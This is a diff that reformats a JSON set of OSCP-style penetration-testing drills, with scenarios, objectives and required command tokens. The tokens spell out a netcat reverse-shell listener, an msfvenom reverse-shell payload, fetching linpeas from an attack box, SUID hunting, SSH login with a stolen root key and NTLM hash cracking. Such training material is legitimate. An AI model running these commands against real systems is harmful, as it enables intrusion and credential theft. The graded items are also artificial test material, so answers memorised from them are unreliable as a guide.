@@ -6,8 +6,14 @@
     "scenario": "You are preparing to receive a reverse shell from a compromised target. You need to set up a listener on your Kali box.",
     "objective": "Use netcat (nc) to listen on port 4444. Disable DNS resolution and increase verbosity.",
     "validation": {
-      "required": ["nc", "-nvlp", "4444"],
-      "forbidden": ["-e"],
+      "required": [
+        "nc",
+        "-nvlp",
+        "4444"
+      ],
+      "forbidden": [
+        "-e"
+      ],
       "hints": {
         "-e": "Hint: You are catching the shell, not executing one. Drop the -e flag."
       }
@@ -21,8 +27,16 @@
     "scenario": "You need to transfer an enumeration script to a target machine. You are currently in the directory containing the script.",
     "objective": "Start a basic Python 3 web server on port 80 to host the files.",
     "validation": {
-      "required": ["python3", "-m", "http.server", "80"],
-      "forbidden": ["python", "SimpleHTTPServer"],
+      "required": [
+        "python3",
+        "-m",
+        "http.server",
+        "80"
+      ],
+      "forbidden": [
+        "python",
+        "SimpleHTTPServer"
+      ],
       "hints": {
         "SimpleHTTPServer": "Hint: That module is for Python 2. Use the modern Python 3 equivalent."
       }
@@ -36,8 +50,13 @@
     "scenario": "You have a low-privileged shell on a target. You want to check your current user's available administrative commands.",
     "objective": "Check what commands the current user can run with elevated privileges without providing a password.",
     "validation": {
-      "required": ["sudo", "-l"],
-      "forbidden": ["su"],
+      "required": [
+        "sudo",
+        "-l"
+      ],
+      "forbidden": [
+        "su"
+      ],
       "hints": {
         "su": "Hint: You don't have the root password. Check what sudo permissions your current user has instead."
       }
@@ -51,8 +70,14 @@
     "scenario": "You downloaded a local enumeration script named 'linpeas.sh' to the target, but you receive a 'permission denied' error when trying to run it.",
     "objective": "Make the 'linpeas.sh' script executable.",
     "validation": {
-      "required": ["chmod", "+x", "linpeas.sh"],
-      "forbidden": ["-R"],
+      "required": [
+        "chmod",
+        "+x",
+        "linpeas.sh"
+      ],
+      "forbidden": [
+        "-R"
+      ],
       "hints": {
         "-R": "Hint: No need to run this recursively. Just target the specific file."
       }
@@ -66,8 +91,15 @@
     "scenario": "You recovered a private SSH key named 'id_rsa' and need to use it to log into a target machine at 10.10.10.20 as the 'root' user.",
     "objective": "Initiate the SSH connection using the private key.",
     "validation": {
-      "required": ["ssh", "-i", "id_rsa", "root@10.10.10.20"],
-      "forbidden": ["telnet"],
+      "required": [
+        "ssh",
+        "-i",
+        "id_rsa",
+        "root@10.10.10.20"
+      ],
+      "forbidden": [
+        "telnet"
+      ],
       "hints": {
         "root": "Hint: Make sure you specify the root user, either as root@IP or with the -l flag."
       }
@@ -81,8 +113,17 @@
     "scenario": "You need to find files with the SUID bit set on a Linux target to hunt for privilege escalation vectors. You want to search from the root directory (/).",
     "objective": "Use the 'find' command to locate files with permission 4000 (SUID) and redirect errors to /dev/null.",
     "validation": {
-      "required": ["find", "/", "-perm", "-4000", "2>/dev/null"],
-      "forbidden": ["-type", "d"],
+      "required": [
+        "find",
+        "/",
+        "-perm",
+        "-4000",
+        "2>/dev/null"
+      ],
+      "forbidden": [
+        "-type",
+        "d"
+      ],
       "hints": {
         "d": "Hint: We are looking for executable files, not directories."
       }
@@ -96,8 +137,20 @@
     "scenario": "You need to generate a Linux 64-bit reverse TCP shell payload using msfvenom to connect back to your Attack Box (10.10.10.10) on port 4444. Save it as 'shell.elf'.",
     "objective": "Write the exact msfvenom command to generate this payload.",
     "validation": {
-      "required": ["msfvenom", "-p", "linux/x64/shell_reverse_tcp", "LHOST=10.10.10.10", "LPORT=4444", "-f", "elf", "-o", "shell.elf"],
-      "forbidden": ["windows"],
+      "required": [
+        "msfvenom",
+        "-p",
+        "linux/x64/shell_reverse_tcp",
+        "LHOST=10.10.10.10",
+        "LPORT=4444",
+        "-f",
+        "elf",
+        "-o",
+        "shell.elf"
+      ],
+      "forbidden": [
+        "windows"
+      ],
       "hints": {
         "meterpreter": "Hint: The OSCP restricts meterpreter usage. Use a standard shell payload (shell_reverse_tcp)."
       }
@@ -111,8 +164,16 @@
     "scenario": "You extracted a Windows NTLM hash and saved it in 'hashes.txt'. You want to crack it using Hashcat and the rockyou.txt wordlist.",
     "objective": "Run hashcat, specifying mode 1000 (NTLM), against 'hashes.txt' using 'rockyou.txt'.",
     "validation": {
-      "required": ["hashcat", "-m", "1000", "hashes.txt", "rockyou.txt"],
-      "forbidden": ["john"],
+      "required": [
+        "hashcat",
+        "-m",
+        "1000",
+        "hashes.txt",
+        "rockyou.txt"
+      ],
+      "forbidden": [
+        "john"
+      ],
       "hints": {
         "john": "Hint: The objective specifies using hashcat."
       }
@@ -126,8 +187,13 @@
     "scenario": "You have a low-privileged shell and want to pull 'linpeas.sh' from your local web server (10.10.10.10).",
     "objective": "Use 'wget' to download the file from your local HTTP server.",
     "validation": {
-      "required": ["wget", "http://10.10.10.10/linpeas.sh"],
-      "forbidden": ["curl"],
+      "required": [
+        "wget",
+        "http://10.10.10.10/linpeas.sh"
+      ],
+      "forbidden": [
+        "curl"
+      ],
       "hints": {
         "curl": "Hint: While curl -O works, the objective requests wget."
       }
@@ -141,8 +207,15 @@
     "scenario": "You need to search the Exploit Database locally on your Kali machine for a Linux privilege escalation exploit.",
     "objective": "Use 'searchsploit' to look for the terms 'linux' and 'privilege escalation'.",
     "validation": {
-      "required": ["searchsploit", "linux", "privilege", "escalation"],
-      "forbidden": ["nmap"],
+      "required": [
+        "searchsploit",
+        "linux",
+        "privilege",
+        "escalation"
+      ],
+      "forbidden": [
+        "nmap"
+      ],
       "hints": {
         "windows": "Hint: Ensure your keywords target Linux."
       }
